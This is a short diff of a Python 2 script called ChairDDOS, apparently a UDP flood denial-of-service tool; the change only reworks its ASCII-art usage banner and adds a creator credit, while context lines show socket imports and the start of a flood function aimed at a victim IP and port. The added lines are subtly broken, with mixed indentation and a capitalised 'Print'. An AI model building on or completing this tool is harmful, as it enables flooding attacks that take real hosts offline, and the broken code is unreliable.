@@ -3,14 +3,16 @@ import socket
 import random
 import sys
 def usage():
-	print "------------------------------{ChairDDOS}----------------"
-	print "                                         |====|"
-	print "                                         |====|"
-	print "                                         |----|"
-	print "                                         |\    \  "
-	print "                                         | |----|"
-	print "                                           |    |"
-	print "  Command: python2 ChairDDOS.py <IP> <Port> <Packet> "
+	print "#-----------------------------{ChairDDOS}---------------"
+	print "#                               |====|"
+	print "#                               |====|"
+	print "#                               |----|"
+	print "#                               |\    \  "
+	print "#                               | |----|"
+	print "#                                 |    |"
+        print "# Command: python2 ChairDDOS.py <IP> <Port> <Packet> "
+        Print "#    Creator: Anacortes"
+        
 	
 def flood(victim, vport, duration):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
